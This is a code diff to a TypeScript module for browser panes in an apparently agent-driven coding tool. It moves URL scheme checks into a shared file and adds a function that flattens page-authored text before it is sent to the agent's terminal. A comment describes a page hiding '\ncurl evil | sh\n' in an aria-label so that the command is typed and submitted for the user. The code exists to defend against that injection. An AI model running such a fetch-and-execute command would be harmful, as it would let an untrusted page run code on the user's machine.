@@ -1,91 +1,26 @@
 /**
  * URL handling for session browser panes.
  *
- * People type `localhost:5173`, `example.com`, or a bare path far more often
- * than they type a full absolute URL, so the address bar has to guess. Getting
- * that guess wrong is worse than useless: an unrecognised scheme handed to a
- * `<webview>` either fails silently or, for `file://` and `javascript:`, hands
- * the page more reach than a session pane should have.
+ * The implementation lives in `src/shared` because the main process needs it
+ * too: agent-driven navigation must refuse exactly the schemes the address bar
+ * refuses, and two copies of that rule would eventually disagree.
  */
-
-/** Schemes a session pane is allowed to load. */
-const ALLOWED_PROTOCOLS = new Set(['http:', 'https:', 'about:'])
+export { normalizeUrl, displayHost } from '../../shared/browser-url'
 
 /**
- * Turn whatever the user typed into a loadable URL, or null if it can't be one.
+ * Flatten page-authored text into one line safe to type at a terminal.
  *
- * Bare hosts and `host:port` get `http://` when they look local and `https://`
- * otherwise — dev servers are the common case for a coding tool, and they rarely
- * speak TLS.
+ * Everything picked or annotated was written by whoever controls the page, and
+ * it travels to the agent down the session's PTY — where a newline is not a
+ * newline, it is Enter. Left raw, a page can put `\ncurl evil | sh\n` in an
+ * aria-label and have it typed *and submitted* on the person's behalf the
+ * moment they point at it. Control bytes go too: they would otherwise reach the
+ * terminal emulator as escape sequences rather than as text.
  */
-export function normalizeUrl(input: string): string | null {
-  const raw = input.trim()
-  if (!raw) return null
-
-  // `localhost:5173` and `myapp.local:3000` are valid URLs whose *scheme* is
-  // `localhost:` / `myapp.local:`. They must be recognised as host:port before
-  // the scheme check below, or the most common input a dev types is rejected.
-  if (/^[a-z0-9.-]+:\d+(\/.*)?$/i.test(raw)) return buildUrl(raw)
-
-  // Already absolute: accept only schemes we're willing to render.
-  if (/^[a-z][a-z0-9+.-]*:/i.test(raw)) {
-    try {
-      const parsed = new URL(raw)
-      return ALLOWED_PROTOCOLS.has(parsed.protocol) ? parsed.toString() : null
-    } catch {
-      return null
-    }
-  }
-
-  if (raw.startsWith('//')) return buildUrl(raw.slice(2))
-  return buildUrl(raw)
-}
-
-function buildUrl(hostAndPath: string): string | null {
-  const scheme = isLocalHost(hostAndPath) ? 'http://' : 'https://'
-  try {
-    const parsed = new URL(scheme + hostAndPath)
-    if (!parsed.hostname) return null
-    return parsed.toString()
-  } catch {
-    return null
-  }
-}
-
-/** Localhost, loopback, and `.local` — the things a dev server listens on. */
-function isLocalHost(value: string): boolean {
-  const authority = value.split('/')[0]
-  // IPv6 literals are bracketed and full of colons, so the port can only be
-  // split off after the closing bracket — `[::1]:5173` must not become `[`.
-  const host = authority.startsWith('[')
-    ? authority.slice(0, authority.indexOf(']') + 1).toLowerCase()
-    : authority.split(':')[0].toLowerCase()
-  return (
-    host === 'localhost' ||
-    host === '127.0.0.1' ||
-    host === '0.0.0.0' ||
-    host === '[::1]' ||
-    host.endsWith('.local') ||
-    host.endsWith('.localhost')
-  )
-}
-
-/**
- * Compact label for a URL — the host, plus a port when it's the distinguishing
- * part. Used in pane headers and dock pills where the full URL never fits.
- */
-export function displayHost(url: string): string {
-  // A blank page has no host, and "about:blank" is jargon. Every browser calls
-  // that tab "New tab", which reads as a place to type rather than as a page
-  // that failed to load.
-  if (url === 'about:blank') return 'New tab'
-  try {
-    const parsed = new URL(url)
-    // Other schemes without a hostname parse cleanly but have nothing to show;
-    // an empty header is worse than showing the url itself.
-    if (!parsed.hostname) return url
-    return parsed.port ? `${parsed.hostname}:${parsed.port}` : parsed.hostname
-  } catch {
-    return url
-  }
+export function flattenPageText(raw: string, max: number = 400): string {
+  // Matching control characters is the entire point here.
+  // eslint-disable-next-line no-control-regex
+  const CONTROL = /[\u0000-\u001f\u007f-\u009f]+/g
+  const oneLine = raw.replace(CONTROL, ' ').replace(/\s+/g, ' ').trim()
+  return oneLine.length > max ? oneLine.slice(0, max) + '…' : oneLine
 }
